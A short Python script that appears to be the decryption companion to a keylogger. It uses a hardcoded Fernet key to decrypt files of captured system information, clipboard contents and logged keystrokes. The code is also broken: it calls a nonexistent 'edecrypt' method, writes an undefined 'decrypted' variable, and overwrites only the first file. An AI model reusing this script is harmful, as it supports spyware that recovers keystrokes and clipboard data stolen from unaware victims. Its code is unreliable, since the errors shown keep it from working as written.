from cryptography.fernet import Fernet
key = "vhLCl029O8oAWiCADT5QS9W51ExJlLv2HNbFDZNzg2Y="

system_information_e = "e_system.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.edecrypt(data)

    with open(encrypted_files[0], 'wb') as f:
        f.write(decrypted)

    count += 1
